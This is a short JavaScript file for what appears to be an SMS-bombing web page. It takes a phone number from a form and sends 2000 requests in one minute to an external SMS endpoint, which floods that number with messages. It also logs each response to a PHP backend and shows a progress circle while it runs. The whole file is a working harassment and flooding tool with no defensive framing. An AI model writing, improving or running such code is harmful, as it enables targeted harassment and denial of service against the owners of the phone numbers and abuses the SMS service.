const totalRequests = 2000; // Total requests to send
const duration = 60; // 1 minute in seconds
const intervalTime = (duration * 1000) / totalRequests; // Calculate interval in ms per request

let requestsSent = 0;

document.getElementById("smsForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const phone = document.getElementById("phone").value;

    // Show loading overlay
    document.getElementById("loadingOverlay").style.display = "flex";
    updateProgress(0);

    const intervalId = setInterval(() => {
        if (requestsSent >= totalRequests) {
            clearInterval(intervalId);
            console.log("Finished sending requests.");
            // Hide loading overlay when complete
            document.getElementById("loadingOverlay").style.display = "none";
            return;
        }

        fetch(`https://granpa.onrender.com/sms?num=${phone}`)
            .then(response => response.json())
            .then(data => {
                saveResponse(phone, data);
            })
            .catch(error => console.error("Error:", error));

        requestsSent++;
        updateProgress((requestsSent / totalRequests) * 100);
    }, intervalTime);
});

function updateProgress(percentage) {
    const progressText = document.getElementById("progressText");
    const progressCircle = document.getElementById("progressCircle");
    progressText.textContent = `${Math.round(percentage)}%`;
    progressCircle.style.background = `conic-gradient(#ff0000 ${percentage}%, #444 ${percentage}% 100%)`;
}

function saveResponse(phone, response) {
    fetch("sms_sender.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone, response })
    })
    .then(res => res.json())
    .then(data => console.log("Response saved:", data))
    .catch(error => console.error("Error saving response:", error));
}
